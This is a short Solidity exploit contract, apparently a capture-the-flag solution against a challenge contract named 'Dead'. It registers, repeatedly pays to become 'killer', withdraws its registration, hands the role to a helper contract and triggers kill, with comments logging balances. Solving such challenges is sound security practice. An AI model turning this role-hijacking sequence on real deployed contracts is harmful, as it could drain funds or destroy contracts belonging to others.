// SPDX-License-Identifier: MIT
pragma solidity 0.7.4;

import "./Dead.sol";
import "hardhat/console.sol";

contract Exploit {
    constructor(Dead instance) payable {
        instance.register{value: 0.01 ether}();

        uint256 killerBalance = instance.balances(instance.killer());
        uint256 balance = address(instance).balance;
        console.log("KILLER BALANCE", killerBalance); // 5 eth
        console.log("BALANCE", balance); // 0.11 eth
        // console.log(balance - (killerBalance * 8) / 5);
        console.log(killerBalance / 10); // 0.5 eth

        console.log("KILLER", instance.killer());
        for (uint256 i; i < 10; i++) {
            instance.becomeKiller{value: 0.05 ether}();
        }
        console.log("KILLER", instance.killer());

        instance.withdrawRegistration();

        Killer newKiller = new Killer();
        instance.changeKiller(address(newKiller));

        instance.canKill();

        newKiller.kill(instance);
    }

    receive() external payable {}
}

contract Killer {
    function kill(Dead instance) external {
        instance.kill();
    }

    receive() external payable {}
}

// 5000000000000000000
// 500000000000000000
// 110000000000000000
